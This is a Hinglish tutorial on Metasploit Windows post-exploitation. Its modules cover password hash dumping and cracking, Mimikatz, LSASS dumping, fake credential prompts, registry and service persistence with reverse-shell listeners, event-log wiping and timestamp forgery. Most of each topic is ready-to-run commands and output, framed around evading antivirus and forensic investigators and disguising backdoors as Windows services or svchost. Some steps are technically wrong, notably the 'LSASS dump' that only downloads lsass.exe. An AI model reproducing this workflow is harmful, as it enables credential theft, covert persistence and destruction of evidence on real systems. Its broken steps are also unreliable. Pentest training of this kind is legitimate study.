
# 🔑 Module 7: Windows Post-Exploitation (Credential Theft)

**Metasploit: Zero-to-Pentester Notes (Aapke Topics)**

---

## Topic 25: `hashdump` (+ John the Ripper)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Hashdump - Password Hashes Churana**  
SAM database se password hashes nikalo aur crack karo! 🔓

### 2. **Ye Kya Hai? (What is it?)**
`hashdump` command Windows SAM (Security Account Manager) database se password hashes extract karta hai. Yeh hashes encrypted passwords hain jo John the Ripper se crack kiye ja sakte hain!

### 3. **Kyun Zaroori Hai?**
- ✅ User passwords nikalna
- ✅ Admin credentials
- ✅ Lateral movement (network mein aage badhna)
- ✅ Offline cracking

### 4. **Ise Kab Use Karna Chahiye?**
- SYSTEM privileges mil gaye
- `lsass.exe` mein migrate ho gaye
- Passwords chahiye
- Network credentials chahiye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Passwords nahi mil payenge
- Lateral movement nahi kar payenge
- Admin credentials miss ho jayenge
- Network penetration incomplete

### 6. **Syntax aur Common Options**
```bash
# Meterpreter
hashdump                    # Hashes dump
getsystem                   # SYSTEM privileges (zaroori!)
migrate [lsass_PID]         # lsass mein migrate (zaroori!)

# John the Ripper (Kali)
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt      # Cracked passwords
```

### 7. **Example 1 (Basic)** 💡
```bash
meterpreter > getsystem
...got system via technique 1

meterpreter > ps | grep lsass
692  lsass.exe  x64  NT AUTHORITY\SYSTEM

meterpreter > migrate 692
[*] Migration completed successfully.

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Victim:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# Hashes save karo
meterpreter > hashdump > /root/hashes.txt
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete workflow: Dump → Crack
# Step 1: Privilege escalation
meterpreter > getsystem
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# Step 2: lsass migration (MANDATORY!)
meterpreter > ps | grep lsass
692  lsass.exe  x64  NT AUTHORITY\SYSTEM

meterpreter > migrate 692
[*] Migration completed successfully.

# Step 3: Hashdump
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ITUser:1002:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::

# Step 4: Kali mein crack karo
┌──(kali㉿kali)-[~]
└─$ echo "ITUser:1002:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::" > hashes.txt

┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
Password123      (ITUser)

┌──(kali㉿kali)-[~]
└─$ john --show hashes.txt
ITUser:Password123

# Analysis:
# lsass migration = MANDATORY (bina iske hashdump fail)
# NTLM hash = 2892d26cdf84d7a70e2eb3b9f05c425e
# Cracked password = Password123
# Ab iss password se lateral movement!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- `lsass.exe` mein migrate nahi karna (hashdump fail!)
- SYSTEM privileges nahi hain
- Hashes save nahi karna
- Wordlist path galat

### 10. **Best Practices / Pro Tips** 💎
- Hamesha `getsystem` pehle
- `lsass.exe` mein migrate MANDATORY
- Hashes file mein save karo
- `rockyou.txt` best wordlist hai

### 11. **Asli Duniya ka Scenario** 🌍
Ek machine hack kiya. Hashdump se 10 users ke hashes mile. John se crack kiye - 3 passwords mile (weak passwords the). Un credentials se 3 aur machines hack kiye (password reuse!). Ek hash se poora network compromise! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] `getsystem` kar sakte hain
- [ ] `lsass.exe` mein migrate kar sakte hain
- [ ] `hashdump` chala sakte hain
- [ ] John the Ripper se crack kar sakte hain

### 13. **FAQs** ❓
**Q: Hashdump fail kyun hota hai?**  
A: lsass mein migrate nahi kiye, ya SYSTEM privileges nahi hain.

**Q: Hash crack nahi ho raha?**  
A: Strong password hai. Bigger wordlist try karo ya brute force.

### 14. **Practice Task** 📝
1. SYSTEM privileges lo
2. lsass mein migrate karo
3. hashdump chalaao
4. Hashes John se crack karo

### 15. **Aakhri Summary** 📌
- 🎯 `hashdump` = Password hashes
- 🔍 lsass migration = MANDATORY
- 💾 John the Ripper = Cracking tool
- ⚡ Weak passwords = Easy crack
- 🚀 Lateral movement ka key!

---

## Topic 26: `load mimikatz` (Plaintext Passwords)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Mimikatz - Plaintext Passwords Ka Raja**  
Memory se seedha plaintext passwords nikalo! 👑

### 2. **Ye Kya Hai? (What is it?)**
Mimikatz ek powerful tool hai jo Windows memory (lsass.exe) se plaintext passwords, hashes, tickets extract karta hai. Yeh ek master key hai - sab kuchh unlock kar deta hai! 🗝️

### 3. **Kyun Zaroori Hai?**
- ✅ Plaintext passwords (cracking nahi chahiye!)
- ✅ Kerberos tickets
- ✅ NTLM hashes
- ✅ Domain credentials

### 4. **Ise Kab Use Karna Chahiye?**
- SYSTEM privileges hain
- Domain environment hai
- Plaintext passwords chahiye
- Hashdump se kaam nahi bana

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Hashes crack karne mein time waste
- Plaintext passwords miss ho jayenge
- Domain credentials nahi milenge
- Advanced attacks nahi kar payenge

### 6. **Syntax aur Common Options**
```bash
# Meterpreter
load mimikatz                           # Mimikatz load
mimikatz_command -f sekurlsa::logonpasswords    # Plaintext passwords
mimikatz_command -f sekurlsa::wdigest           # WDigest passwords
mimikatz_command -f lsadump::sam                # SAM dump
mimikatz_command -f lsadump::secrets            # LSA secrets
```

### 7. **Example 1 (Basic)** 💡
```bash
meterpreter > getsystem
meterpreter > load mimikatz
[*] Loading extension mimikatz...
[*] Success.

meterpreter > mimikatz_command -f sekurlsa::logonpasswords
Hostname: VICTIM-PC
Username: Victim
Domain: WORKGROUP
Password: MyPassword123

Username: Administrator
Domain: WORKGROUP
Password: Admin@2024
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete workflow: Load → Extract → Use
# Step 1: Privilege escalation
meterpreter > getsystem
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# Step 2: Mimikatz load
meterpreter > load mimikatz
[*] Success.

# Step 3: Plaintext passwords
meterpreter > mimikatz_command -f sekurlsa::logonpasswords
Authentication Id : 0 ; 123456
Session           : Interactive from 1
User Name         : admin
Domain            : COMPANY
Logon Server      : DC01
Logon Time        : 1/15/2024 10:30:00 AM
SID               : S-1-5-21-...
        msv :
         [00000003] Primary
         * Username : admin
         * Domain   : COMPANY
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : ...
        wdigest :
         * Username : admin
         * Domain   : COMPANY
         * Password : CompanyAdmin@123    # PLAINTEXT! 🎉

# Step 4: LSA Secrets (stored credentials)
meterpreter > mimikatz_command -f lsadump::secrets
Domain : COMPANY
SysKey : ...
Local name : VICTIM-PC
Policy subsystem is : 1.14
LSA Key : ...

Secret  : DefaultPassword
cur/text: P@ssw0rd123

# Step 5: Use credentials
meterpreter > background
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 192.168.1.110
msf6 > set SMBUser admin
msf6 > set SMBPass CompanyAdmin@123
msf6 > exploit
[*] Meterpreter session 2 opened    # New machine hacked!

# Analysis:
# Plaintext password = No cracking needed!
# Domain credentials = Lateral movement
# LSA secrets = Stored passwords
# One machine → Entire network!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- SYSTEM privileges nahi hain
- Mimikatz load nahi kar paye
- WDigest disabled hai (Windows 10+)
- Credentials note nahi kiye

### 10. **Best Practices / Pro Tips** 💎
- `getsystem` mandatory
- Output file mein save karo
- Domain environment mein powerful
- Credentials database mein store karo (`creds`)

### 11. **Asli Duniya ka Scenario** 🌍
Domain controller hack kiya. Mimikatz se 50+ domain users ke plaintext passwords mile! Ek baar mein poora network compromise. Yeh Mimikatz ki power hai! 👑

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] Mimikatz load kar sakte hain
- [ ] Plaintext passwords nikaal sakte hain
- [ ] LSA secrets dekh sakte hain
- [ ] Domain credentials extract kar sakte hain

### 13. **FAQs** ❓
**Q: Plaintext passwords nahi mil rahe?**  
A: Windows 10+ mein WDigest disabled hai. NTLM hashes use karo.

**Q: Mimikatz load nahi ho raha?**  
A: SYSTEM privileges chahiye. `getsystem` chalaao.

### 14. **Practice Task** 📝
1. SYSTEM privileges lo
2. `load mimikatz` chalaao
3. `sekurlsa::logonpasswords` try karo
4. Credentials note karo

### 15. **Aakhri Summary** 📌
- 🎯 Mimikatz = Plaintext passwords
- 🔍 `sekurlsa::logonpasswords` = Main command
- 💾 LSA secrets = Stored credentials
- ⚡ Domain environment = Most powerful
- 🚀 No cracking needed!

---

## Topic 27: `lsass.exe` Dump (Offline Cracking)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**LSASS Dump - Offline Analysis**  
Memory dump lo aur apne system par analyze karo! 💾

### 2. **Ye Kya Hai? (What is it?)**
`lsass.exe` process ka memory dump lena aur use offline (apne Kali mein) Mimikatz se analyze karna. Yeh stealth technique hai - victim system par Mimikatz nahi chalana padta!

### 3. **Kyun Zaroori Hai?**
- ✅ Stealth (victim par Mimikatz nahi)
- ✅ Antivirus bypass
- ✅ Offline analysis
- ✅ Forensic evidence

### 4. **Ise Kab Use Karna Chahiye?**
- Antivirus Mimikatz detect kar raha hai
- Stealth operation chahiye
- Offline analysis better hai
- Evidence preserve karna hai

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Mimikatz victim par detect hoga
- Antivirus alert trigger
- Stealth compromise
- Evidence lost

### 6. **Syntax aur Common Options**
```bash
# Meterpreter (dump lena)
ps | grep lsass
migrate [lsass_PID]
download C:\\Windows\\System32\\lsass.exe lsass.dmp

# Kali (offline analysis)
pypykatz lsa minidump lsass.dmp
# Ya Mimikatz Windows mein
```

### 7. **Example 1 (Basic)** 💡
```bash
# Step 1: lsass dump
meterpreter > ps | grep lsass
692  lsass.exe

meterpreter > migrate 692
meterpreter > download C:\\Windows\\System32\\lsass.exe /root/lsass.dmp

# Step 2: Offline analysis (Kali)
┌──(kali㉿kali)-[~]
└─$ pypykatz lsa minidump lsass.dmp
Username: admin
Password: P@ssw0rd123
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Stealth approach
meterpreter > getsystem
meterpreter > ps | grep lsass
692  lsass.exe  x64  NT AUTHORITY\SYSTEM

meterpreter > migrate 692
meterpreter > download C:\\Windows\\System32\\lsass.exe /root/victim_lsass.dmp
[*] Downloaded 50.23 MB

# Offline analysis
┌──(kali㉿kali)-[~]
└─$ pypykatz lsa minidump victim_lsass.dmp > creds.txt

# Analysis:
# Victim par Mimikatz nahi chala
# Antivirus bypass
# Offline analysis = Safe
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- lsass mein migrate nahi karna
- Large file download (network slow)
- Dump file delete nahi karna (evidence!)

### 10. **Best Practices / Pro Tips** 💎
- Dump file compress karo (smaller)
- Offline analysis safer hai
- pypykatz (Python) ya Mimikatz use karo
- Dump file secure delete karo

### 11. **Asli Duniya ka Scenario** 🌍
Antivirus Mimikatz ko detect kar raha tha. lsass dump liya, apne Kali mein analyze kiya. Credentials mile, antivirus ko pata nahi chala! Stealth win! 🥷

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] lsass dump le sakte hain
- [ ] Offline analysis kar sakte hain
- [ ] pypykatz use kar sakte hain
- [ ] Stealth approach samajh aayi

### 13. **FAQs** ❓
**Q: Dump file bahut badi hai?**  
A: Compress karo ya network fast hona chahiye.

**Q: pypykatz kya hai?**  
A: Python-based Mimikatz alternative (Kali mein pre-installed).

### 14. **Practice Task** 📝
1. lsass mein migrate karo
2. lsass.exe dump download karo
3. pypykatz se analyze karo
4. Credentials extract karo

### 15. **Aakhri Summary** 📌
- 🎯 LSASS dump = Offline analysis
- 🔍 pypykatz = Python tool
- 💾 Stealth = Antivirus bypass
- ⚡ Victim par Mimikatz nahi
- 🚀 Safe aur effective!

---

## Topic 28: Fake Login Prompt (`post/windows/gather/phish_windows_credentials`)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Fake Login Prompt - Victim Ko Phish Karo**  
Fake Windows login dikhaao, password type karwao! 🎣

### 2. **Ye Kya Hai? (What is it?)**
Yeh module victim ko fake Windows credential prompt dikhata hai. Victim apna password type karta hai aur woh aapko mil jaata hai! Social engineering + technical attack!

### 3. **Kyun Zaroori Hai?**
- ✅ Current user ka password
- ✅ Plaintext password
- ✅ No cracking needed
- ✅ Social engineering

### 4. **Ise Kab Use Karna Chahiye?**
- Hashdump/Mimikatz fail ho gaye
- Current user password chahiye
- Victim active hai
- Social engineering possible hai

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Current user password miss
- Complex attacks try karenge
- Time waste
- Simple solution miss

### 6. **Syntax aur Common Options**
```bash
use post/windows/gather/phish_windows_credentials
set SESSION [session_id]
run
```

### 7. **Example 1 (Basic)** 💡
```bash
meterpreter > background
msf6 > use post/windows/gather/phish_windows_credentials
msf6 post(phish_windows_credentials) > set SESSION 1
msf6 post(phish_windows_credentials) > run

[*] Phishing for credentials...
[*] Displaying fake login prompt
[+] Credentials captured: Victim:MyPassword123
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete workflow
meterpreter > background
msf6 > use post/windows/gather/phish_windows_credentials
msf6 > set SESSION 1
msf6 > run

[*] Victim ko fake prompt dikh raha hai
# Victim password type karta hai
[+] Username: admin
[+] Password: CompanyAdmin@2024

# Credentials use karo
msf6 > creds
Credentials
===========
host          user   password
----          ----   --------
192.168.1.105 admin  CompanyAdmin@2024

# Analysis:
# Victim ko legitimate prompt laga
# Password plaintext mein mila
# No cracking, no Mimikatz needed!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Victim suspicious ho gaya
- Multiple times try karna (obvious!)
- Session background nahi karna

### 10. **Best Practices / Pro Tips** 💎
- Ek baar hi try karo
- Victim active hona chahiye
- Timing important hai
- Credentials `creds` mein save hote hain

### 11. **Asli Duniya ka Scenario** 🌍
Mimikatz fail ho gaya (WDigest disabled). Fake prompt dikhaaya. Victim ne password type kiya (legitimate laga). Password mila! Simple but effective! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] Fake prompt module use kar sakte hain
- [ ] Victim se password phish kar sakte hain
- [ ] Plaintext password milta hai
- [ ] Social engineering samajh aayi

### 13. **FAQs** ❓
**Q: Victim password nahi type kar raha?**  
A: Suspicious lag raha hai. Timing improve karo.

**Q: Multiple times try kar sakte hain?**  
A: Nahi! Ek baar fail ho gaya toh victim alert ho jayega.

### 14. **Practice Task** 📝
1. Meterpreter session background karo
2. Phishing module use karo
3. Fake prompt dekho
4. Test password type karo

### 15. **Aakhri Summary** 📌
- 🎯 Fake prompt = Social engineering
- 🔍 Plaintext password = Direct
- 💾 Simple but effective
- ⚡ Victim ko legitimate lagta hai
- 🚀 Last resort option!

---

## 🎁 **Module 7 Complete!**

```
┌─────────────────────────────────────────────────────────┐
│  Module 7: Credential Theft Master! 🔑                  │
│                                                          │
│  ✅ hashdump = Password hashes + John                   │
│  ✅ Mimikatz = Plaintext passwords                      │
│  ✅ LSASS dump = Offline analysis                       │
│  ✅ Fake prompt = Social engineering                    │
│                                                          │
│  Pro Tip: Try in order:                                 │
│  1. Mimikatz (fastest)                                  │
│  2. hashdump + John (if Mimikatz fails)                 │
│  3. LSASS dump (stealth)                                │
│  4. Fake prompt (last resort)                           │
│                                                          │
│  Next: Module 8 - Stealth & Persistence! 🥷            │
└─────────────────────────────────────────────────────────┘
```

**Module 7 Complete! Ready for Module 8?** 🚀

=============================================================

# 🥷 Module 8: Windows Post-Exploitation (Stealth & Persistence)

**Metasploit: Zero-to-Pentester Notes (Aapke Topics)**

---

## Topic 29: Persistence Module (`exploit/windows/local/persistence`)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Persistence Module - Hamesha Wapas Aao**  
System restart ke baad bhi access bana rahe! 🔄

### 2. **Ye Kya Hai? (What is it?)**
Persistence module registry mein entry add karta hai jo system boot hone par automatically payload execute karta hai. Yeh ek permanent backdoor hai!

### 3. **Kyun Zaroori Hai?**
- ✅ System restart ke baad access
- ✅ Permanent backdoor
- ✅ Multiple entry points
- ✅ Long-term access

### 4. **Ise Kab Use Karna Chahiye?**
- Long-term access chahiye
- System restart ho sakta hai
- Permanent backdoor chahiye
- Client engagement long hai

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- System restart = Access kho jayega
- Har baar re-exploit karna padega
- Time waste
- Unprofessional

### 6. **Syntax aur Common Options**
```bash
use exploit/windows/local/persistence
set SESSION [session_id]
set STARTUP SYSTEM    # System startup
set STARTUP USER      # User login
run
```

### 7. **Example 1 (Basic)** 💡
```bash
meterpreter > background
msf6 > use exploit/windows/local/persistence
msf6 exploit(persistence) > set SESSION 1
msf6 exploit(persistence) > show options
msf6 exploit(persistence) > run

[*] Creating persistence script...
[*] Persistence script installed
[*] Backdoor will run on system startup
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete persistence setup
meterpreter > background

msf6 > use exploit/windows/local/persistence
msf6 > set SESSION 1
msf6 > set STARTUP SYSTEM
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444
msf6 > run

[*] Running persistence module...
[*] Resource file for cleanup: /root/.msf4/logs/persistence/VICTIM-PC_20240115.rc
[*] Creating VBS script...
[*] Persistence installed in registry
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\

# Listener setup (hamesha running)
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444
msf6 > set ExitOnSession false
msf6 > exploit -j

# System restart ke baad
[*] Meterpreter session 2 opened automatically!

# Analysis:
# Registry entry = Automatic execution
# VBS script = Payload launcher
# ExitOnSession false = Multiple connections
# Permanent backdoor installed!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Listener setup nahi karna (connection fail)
- ExitOnSession true (ek hi connection)
- Cleanup script save nahi karna
- Admin rights nahi hain

### 10. **Best Practices / Pro Tips** 💎
- Cleanup script save karo (removal ke liye)
- `ExitOnSession false` zaroori
- Listener hamesha running rakho
- Multiple persistence methods use karo

### 11. **Asli Duniya ka Scenario** 🌍
Client engagement 30 days ka tha. Persistence install kiya. 15 din baad victim ne system restart kiya. Automatically session wapas mil gaya! Long-term access successful! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] Persistence module use kar sakte hain
- [ ] Registry entry add kar sakte hain
- [ ] Listener setup kar sakte hain
- [ ] Restart ke baad access mil sakta hai

### 13. **FAQs** ❓
**Q: Persistence detect ho jayega?**  
A: Registry monitoring tools detect kar sakte hain. Stealth ke liye advanced methods use karo.

**Q: Cleanup kaise karein?**  
A: Module ke saath cleanup script milta hai (.rc file).

### 14. **Practice Task** 📝
1. Meterpreter session background karo
2. Persistence module use karo
3. Listener setup karo
4. VM restart karke test karo

### 15. **Aakhri Summary** 📌
- 🎯 Persistence = Permanent backdoor
- 🔍 Registry entry = Auto-execution
- 💾 Listener = Hamesha running
- ⚡ Restart = Auto-reconnect
- 🚀 Long-term access!

---

## Topic 30: Persistence Service (`exploit/windows/local/persistence_service`)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Persistence Service - Windows Service Backdoor**  
Legitimate service jaisa backdoor! 🎭

### 2. **Ye Kya Hai? (What is it?)**
Yeh module Windows service create karta hai jo automatically start hoti hai. Service legitimate lagti hai aur detection kam hota hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Legitimate dikhta hai
- ✅ Service manager mein visible
- ✅ Auto-start on boot
- ✅ Better stealth

### 4. **Ise Kab Use Karna Chahiye?**
- VBS script suspicious lag raha hai
- Service-based persistence chahiye
- Admin rights hain
- Better stealth chahiye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- VBS script detect ho jayega
- Registry monitoring catch karega
- Less professional approach
- Detection zyada

### 6. **Syntax aur Common Options**
```bash
use exploit/windows/local/persistence_service
set SESSION [session_id]
set SERVICE_NAME [name]
run
```

### 7. **Example 1 (Basic)** 💡
```bash
meterpreter > background
msf6 > use exploit/windows/local/persistence_service
msf6 > set SESSION 1
msf6 > set SERVICE_NAME WindowsUpdate
msf6 > run

[*] Creating service...
[+] Service installed: WindowsUpdate
[*] Service will start on boot
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Service-based persistence
meterpreter > getsystem
meterpreter > background

msf6 > use exploit/windows/local/persistence_service
msf6 > set SESSION 1
msf6 > set SERVICE_NAME MicrosoftUpdateService
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 443
msf6 > run

[*] Creating persistence service...
[*] Uploading payload...
[*] Creating service: MicrosoftUpdateService
[+] Service installed successfully
[*] Service set to auto-start

# Verify
meterpreter > shell
C:\> sc query MicrosoftUpdateService
SERVICE_NAME: MicrosoftUpdateService
STATE: RUNNING
START_TYPE: AUTO_START

# Listener
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 443
msf6 > set ExitOnSession false
msf6 > exploit -j

# Analysis:
# Service name = Legitimate looking
# Auto-start = Boot persistence
# Port 443 = HTTPS (firewall bypass)
# Service manager mein visible par suspicious nahi!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Suspicious service name (`backdoor`, `hack`)
- Admin rights nahi hain
- Service name already exists
- Listener setup nahi karna

### 10. **Best Practices / Pro Tips** 💎
- Legitimate service name (`WindowsUpdate`, `MicrosoftService`)
- Port 443/80 use karo
- Service description add karo (more legitimate)
- Multiple services mat banao (suspicious)

### 11. **Asli Duniya ka Scenario** 🌍
IT admin ne Task Manager check kiya. Service "MicrosoftUpdateService" dikhi - legitimate lagi. Suspicious nahi laga. Backdoor undetected raha! Service-based persistence win! 🎭

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] Service-based persistence kar sakte hain
- [ ] Legitimate service name use kar sakte hain
- [ ] Auto-start configure kar sakte hain
- [ ] Better stealth achieve kar sakte hain

### 13. **FAQs** ❓
**Q: Service aur registry persistence mein kya better hai?**  
A: Service zyada legitimate lagti hai, detection kam.

**Q: Service remove kaise karein?**  
A: `sc delete [service_name]` command.

### 14. **Practice Task** 📝
1. SYSTEM privileges lo
2. Service persistence module use karo
3. Legitimate service name do
4. Verify karo `sc query` se

### 15. **Aakhri Summary** 📌
- 🎯 Service persistence = Legitimate
- 🔍 Auto-start = Boot persistence
- 💾 Better stealth = Less detection
- ⚡ Service manager = Visible but not suspicious
- 🚀 Professional approach!

---

## Topic 31: Cleaning Tracks (`clearev`)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Clearev - Apne Nishaan Mitao**  
Event logs clear karo, evidence delete karo! 🧹

### 2. **Ye Kya Hai? (What is it?)**
`clearev` command Windows Event Viewer ke saare logs (Application, System, Security) clear kar deta hai. Yeh crime scene cleanup hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Evidence removal
- ✅ Forensic analysis se bachna
- ✅ Activity logs delete
- ✅ Stealth operation

### 4. **Ise Kab Use Karna Chahiye?**
- Post-exploitation complete
- Exit karne se pehle
- Evidence remove karna hai
- Forensic team aa sakti hai

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Logs mein activity visible
- Forensic analysis successful
- Attack timeline reconstruct
- Evidence against you

### 6. **Syntax aur Common Options**
```bash
clearev    # All logs clear
```

### 7. **Example 1 (Basic)** 💡
```bash
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 567 records from System...
[*] Wiping 890 records from Security...
[*] Completed clearing event logs
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete cleanup workflow
# Step 1: Apna kaam complete karo
meterpreter > hashdump
meterpreter > download sensitive_data.xlsx

# Step 2: Persistence remove (if needed)
meterpreter > shell
C:\> sc delete MicrosoftUpdateService
C:\> exit

# Step 3: Logs clear
meterpreter > clearev
[*] Wiping event logs...
[*] Completed

# Step 4: Verify (optional)
meterpreter > shell
C:\> eventvwr
# Event Viewer kholo - saare logs empty!

# Analysis:
# Activity logs = Deleted
# Login records = Gone
# Forensic analysis = Difficult
# Clean exit!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Kaam complete hone se pehle clear karna
- Admin rights nahi hain
- Backup logs ignore karna
- Suspicious activity (logs suddenly empty)

### 10. **Best Practices / Pro Tips** 💎
- Last step mein clear karo
- Admin/SYSTEM rights zaroori
- Specific entries delete better (less suspicious)
- Backup logs bhi check karo

### 11. **Asli Duniya ka Scenario** 🌍
Pentest complete. Exit se pehle `clearev` chalaaya. IT team ne logs check kiye - kuchh nahi mila! Forensic analysis fail. Clean operation! 🧹

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] `clearev` command aata hai
- [ ] Event logs clear kar sakte hain
- [ ] Evidence removal kar sakte hain
- [ ] Clean exit kar sakte hain

### 13. **FAQs** ❓
**Q: Clearev suspicious nahi hai?**  
A: Haan! Suddenly empty logs suspicious hain. Specific entries delete better.

**Q: Backup logs kya hain?**  
A: Windows backup logs rakhta hai. Woh bhi check karo.

### 14. **Practice Task** 📝
1. Event Viewer kholo (before)
2. Logs dekho
3. `clearev` chalaao
4. Event Viewer check karo (after)

### 15. **Aakhri Summary** 📌
- 🎯 `clearev` = Evidence removal
- 🔍 All logs = Deleted
- 💾 Forensic analysis = Difficult
- ⚡ Last step = Clean exit
- 🚀 Stealth operation!

---

## Topic 32: Timestamp Manipulation (`timestomp`)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Timestomp - File Timestamps Badlo**  
File ka "Last Modified" time change karo! ⏰

### 2. **Ye Kya Hai? (What is it?)**
`timestomp` command file ke timestamps (Created, Modified, Accessed) change karta hai. Yeh ek time machine hai - file purani lag sakti hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Uploaded files chhupana
- ✅ Timeline manipulation
- ✅ Forensic confusion
- ✅ Stealth

### 4. **Ise Kab Use Karna Chahiye?**
- File upload kiye hain
- Backdoor install kiya hai
- Timeline hide karna hai
- Forensic analysis se bachna hai

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- New files easily detect
- Timeline analysis successful
- Uploaded files pakde jayenge
- Forensic evidence strong

### 6. **Syntax aur Common Options**
```bash
timestomp [file] -v              # View timestamps
timestomp [file] -m "01/01/2020 12:00:00"    # Modify time
timestomp [file] -c "01/01/2020 12:00:00"    # Create time
timestomp [file] -a "01/01/2020 12:00:00"    # Access time
timestomp [file] -z "01/01/2020 12:00:00"    # All times
```

### 7. **Example 1 (Basic)** 💡
```bash
# View timestamps
meterpreter > timestomp C:\\Windows\\Temp\\backdoor.exe -v
Modified: 2024-01-15 14:30:00
Accessed: 2024-01-15 14:30:00
Created: 2024-01-15 14:30:00

# Change timestamps
meterpreter > timestomp C:\\Windows\\Temp\\backdoor.exe -z "2019-01-01 10:00:00"
[*] Setting MACE attributes on C:\Windows\Temp\backdoor.exe

# Verify
meterpreter > timestomp C:\\Windows\\Temp\\backdoor.exe -v
Modified: 2019-01-01 10:00:00
Accessed: 2019-01-01 10:00:00
Created: 2019-01-01 10:00:00
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Stealth file upload
# Step 1: Upload backdoor
meterpreter > upload /root/backdoor.exe C:\\Windows\\System32\\svchost2.exe

# Step 2: Check existing file timestamp
meterpreter > timestomp C:\\Windows\\System32\\svchost.exe -v
Created: 2019-06-15 08:00:00

# Step 3: Match timestamp
meterpreter > timestomp C:\\Windows\\System32\\svchost2.exe -z "2019-06-15 08:00:00"
[*] Timestamps set

# Step 4: Verify
meterpreter > shell
C:\> dir C:\\Windows\\System32\\svchost*
2019-06-15  08:00 AM    svchost.exe
2019-06-15  08:00 AM    svchost2.exe    # Same timestamp!

# Analysis:
# Backdoor = Old file jaisa lagta hai
# Timeline = Manipulated
# Forensic = Confused
# Stealth = Successful!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Future date set karna (obvious!)
- Random date (suspicious)
- Existing files se match nahi karna
- Verify nahi karna

### 10. **Best Practices / Pro Tips** 💎
- Existing system files ka timestamp copy karo
- Realistic dates use karo
- `-z` flag se saare timestamps ek saath
- Verify karo `-v` se

### 11. **Asli Duniya ka Scenario** 🌍
Backdoor upload kiya. Timestamp 2024 tha (obvious!). System32 ke files ka timestamp dekha - 2019. Backdoor ka bhi 2019 kar diya. Forensic team confused - file purani lag rahi thi! 🎭

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] `timestomp` command aata hai
- [ ] Timestamps view kar sakte hain
- [ ] Timestamps change kar sakte hain
- [ ] Stealth upload kar sakte hain

### 13. **FAQs** ❓
**Q: Kaunsa timestamp change karein?**  
A: `-z` flag se saare ek saath change karo.

**Q: Forensic tools detect kar sakte hain?**  
A: Advanced tools detect kar sakte hain, par basic analysis confuse hoga.

### 14. **Practice Task** 📝
1. Test file upload karo
2. Timestamp view karo
3. System file ka timestamp copy karo
4. Test file ka timestamp change karo

### 15. **Aakhri Summary** 📌
